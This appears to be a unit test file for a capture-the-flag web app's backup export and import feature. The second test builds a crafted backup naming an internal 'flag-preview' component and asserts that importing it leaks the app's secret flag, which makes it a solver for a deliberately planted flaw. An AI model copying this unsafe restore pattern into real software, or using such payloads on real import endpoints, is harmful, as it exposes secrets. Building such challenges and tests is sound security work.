import io
import json
import os
import sys
import tempfile
import unittest


sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from app import create_app  # noqa: E402


class BackupBounceTests(unittest.TestCase):
    def setUp(self):
        handle = tempfile.NamedTemporaryFile(delete=False)
        self.database_path = handle.name
        handle.close()
        self.app = create_app(
            {
                "TESTING": True,
                "DATABASE": self.database_path,
                "SECRET_KEY": "test-secret",
            }
        )
        with self.app.app_context():
            self.app.init_db()
        self.client = self.app.test_client()
        self.client.post(
            "/register",
            data={"username": "backupper", "password": "restore123"},
            follow_redirects=True,
        )

    def tearDown(self):
        if os.path.exists(self.database_path):
            os.unlink(self.database_path)

    def test_export_returns_component_backup(self):
        response = self.client.get("/export")
        self.assertEqual(response.status_code, 200)
        decoded = self.app.decode_backup(response.data)
        self.assertEqual(decoded["format"], "BBSC/1")
        self.assertIn("display_name", decoded["fields"])

    def test_component_import_recovers_flag_without_code_execution(self):
        payload = json.dumps(
            {
                "format": "BBSC/1",
                "fields": {},
                "components": [
                    {
                        "name": "internal.flag-preview",
                        "props": {
                            "field": "favorite_quote",
                            "preview_key": "volunteer-preview",
                        },
                    }
                ],
            }
        ).encode("utf-8")
        response = self.client.post(
            "/import",
            data={"backup": (io.BytesIO(payload), "exploit.bbsc")},
            content_type="multipart/form-data",
            follow_redirects=True,
        )
        self.assertEqual(response.status_code, 200)
        self.assertIn(self.app.config["FLAG"].encode("utf-8"), response.data)


if __name__ == "__main__":
    unittest.main()
